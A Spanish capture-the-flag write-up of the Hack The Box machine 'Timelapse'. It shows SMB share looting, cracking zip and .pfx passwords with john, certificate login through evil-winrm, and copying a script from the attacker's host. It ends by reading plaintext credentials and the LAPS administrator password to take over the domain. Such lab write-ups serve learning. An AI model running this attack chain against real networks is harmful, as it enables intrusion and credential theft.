# 10.10.11.152 - Timelpase
![Timelapse](https://user-images.githubusercontent.com/96772264/205365063-9ef89d8b-1b63-4087-9ae1-bdd579322a6a.png)

------------------------
# Part 1: Enumeración

Puertos: 53(dns),88(kerberos),135(rpc),139(ldap),445(smb),464,593,636,3269,3268,5986(winrm),9389:  
- Nombre: timelapse.htb  

------------------------
# Part 2: Accediendo a smb

```console
└─$ smbmap -H 10.10.11.152 -u 'test'
	IPC$                                              	READ ONLY	Remote IPC
	Shares                                            	READ ONLY	
└─$ smbmap -H 10.10.11.152 -u 'test' -r "Shares"
	dr--r--r--                0 Mon Oct 25 21:40:06 2021	Dev
	dr--r--r--                0 Mon Oct 25 17:55:14 2021	HelpDesk
└─$ smbmap -H 10.10.11.152 -u 'test' -r "Shares/Dev"
	fr--r--r--             2611 Mon Oct 25 23:05:30 2021	winrm_backup.zip
└─$ smbmap -H 10.10.11.152 -u 'test' --download "Shares/Dev/winrm_backup.zip"

└─$ unzip 10.10.11.152-Shares_Dev_winrm_backup.zip
[10.10.11.152-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password:
└─$ zip2john 10.10.11.152-Shares_Dev_winrm_backup.zip > hash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
supremelegacy    (10.10.11.152-Shares_Dev_winrm_backup.zip/legacyy_dev_auth.pfx)
└─$ unzip winrm_backup.zip
[10.10.11.152-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password: supremelegacy
```

------------------------
# Part 3: Crackenado archivos

Los archivos pfx sirven para crear llaves con ellos.
```console
└─$ openssl pkcs12 -in ./legacyy_dev_auth.pfx -nocerts -out llave_legacy.key
Enter Import Password:
└─$ /usr/share/john/pfx2john.py ./legacyy_dev_auth.pfx > hash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
thuglegacy       (legacyy_dev_auth.pfx)
└─$ openssl pkcs12 -in ./legacyy_dev_auth.pfx -nocerts -out llave_legacy.key
# Tanto como password como PEM pass que nos piden ponemos "thuglegacy"
└─$ openssl pkcs12 -in ./legacyy_dev_auth.pfx -nokeys -out certificado.pem
```
```
└─$ evil-winrm -i 10.10.11.152 -k llave_legacy.key -c certificado.pem -S
*Evil-WinRM* PS C:\Users\legacyy\Documents>

*Evil-WinRM* PS C:\Users\legacyy\Documents> copy \\10.10.14.16\carpeta\enumeracion_windows.bat
```
- Vemos que en el historial de comandos en Powershell hay creds svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV

------------------------
# Part 4: Escalando privilegios: LAPS_READERS

```console
└─$ evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```
- Nuestro usuario está en LAPS_READERS
```console
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
ms-mcs-admpwd     : EB71J5m-1V-18@%z#w9&4L3x

└─$ evil-winrm -i 10.10.11.152 -u 'administrator' -p 'EB71J5m-1V-18@%z#w9&4L3x' -S
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
timelapse\administrator
```
